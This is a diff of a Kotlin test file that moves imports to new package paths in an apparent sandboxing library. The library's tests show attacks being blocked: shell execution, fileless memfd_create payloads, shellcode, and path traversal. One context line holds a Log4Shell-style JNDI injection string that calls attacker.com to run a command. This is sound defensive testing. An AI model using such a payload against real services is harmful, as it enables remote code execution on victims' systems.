@@ -1,9 +1,8 @@
 package demo
-
-import io.mazewall.LinuxNative
-import io.mazewall.Policy
-import io.mazewall.core.Arch
-import io.mazewall.core.NativeArg
+import io.mazewall.platform.native.LinuxNative
+import io.mazewall.enforcer.api.Policy
+import io.mazewall.platform.syscall.Arch
+import io.mazewall.platform.syscall.NativeArg
 import io.mazewall.enforcer.api.ContainedExecutors
 import io.mazewall.enforcer.api.ContainmentViolationEvidence
 import io.mazewall.enforcer.api.ContainmentViolationException
@@ -38,7 +37,7 @@ class ProtectionDemonstrationTest {
     fun `Attack 1 - Classic Shell Execution Protected`() {
         val osName = System.getProperty("os.name")
         if (!osName.equals("Linux", ignoreCase = true)) return
-        if (!io.mazewall.Platform.isSupported()) return
+        if (!io.mazewall.enforcer.api.Platform.isSupported()) return
 
         DemoFixture.create("protected-shell").use { fixture ->
             val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"
@@ -59,7 +58,7 @@ class ProtectionDemonstrationTest {
     fun `Attack 2 - Fileless Payload Creation Protected`() {
         val osName = System.getProperty("os.name")
         if (!osName.equals("Linux", ignoreCase = true)) return
-        if (!io.mazewall.Platform.isSupported()) return
+        if (!io.mazewall.enforcer.api.Platform.isSupported()) return
 
         val executor = Executors.newSingleThreadExecutor()
         val safeExecutor = ContainedExecutors.wrap(executor, Policy.NO_EXEC)
@@ -73,8 +72,8 @@ class ProtectionDemonstrationTest {
                         val res =
                         LinuxNative.raw.syscall(
                             arch.memfdCreate.toLong(),
-                            io.mazewall.core.NativeArg.MemoryArg(ConfinedSegment(name)),
-                            io.mazewall.core.NativeArg.NullArg,
+                            io.mazewall.platform.syscall.NativeArg.MemoryArg(ConfinedSegment(name)),
+                            io.mazewall.platform.syscall.NativeArg.NullArg,
                         )
 
                         assertTrue(res is LinuxNative.SyscallResult.Error, "memfd_create should be blocked by NO_EXEC")
@@ -91,7 +90,7 @@ class ProtectionDemonstrationTest {
     fun `Attack 3 - Shellcode and Memory Pivoting Protected`() {
         val osName = System.getProperty("os.name")
         if (!osName.equals("Linux", ignoreCase = true)) return
-        if (!io.mazewall.Platform.isSupported()) return
+        if (!io.mazewall.enforcer.api.Platform.isSupported()) return
 
         val executor = Executors.newSingleThreadExecutor()
         val safeExecutor = ContainedExecutors.wrap(executor, Policy.builder().build())
@@ -153,7 +152,7 @@ class ProtectionDemonstrationTest {
     fun `Attack 4 - Path Traversal Protected`() {
         val osName = System.getProperty("os.name")
         if (!osName.equals("Linux", ignoreCase = true)) return
-        if (!io.mazewall.Platform.isSupported()) return
+        if (!io.mazewall.enforcer.api.Platform.isSupported()) return
 
         val executor = Executors.newSingleThreadExecutor()
         // PURE_COMPUTE includes PURE_COMPUTE_UNSAFE and blocks OPENAT, and automatically enables Landlock
@@ -178,7 +177,7 @@ class ProtectionDemonstrationTest {
     fun `Attack 5 - synchronous native open protected`() {
         val osName = System.getProperty("os.name")
         if (!osName.equals("Linux", ignoreCase = true)) return
-        if (!io.mazewall.Platform.isSupported()) return
+        if (!io.mazewall.enforcer.api.Platform.isSupported()) return
 
         val executor = Executors.newSingleThreadExecutor()
         // PURE_COMPUTE uses PURE_COMPUTE_UNSAFE and automatically enables Landlock
@@ -191,7 +190,7 @@ class ProtectionDemonstrationTest {
                         val openResult =
                         LinuxNative.fileSystem.open(
                             ConfinedSegment(arena.allocateFrom("/etc/hosts")),
-                            io.mazewall.core.OpenFlags(0), // O_RDONLY
+                            io.mazewall.platform.lifecycle.OpenFlags(0), // O_RDONLY
                         )
 
                         // If Landlock restricts the path, open returns -1 and errno is EACCES (13)
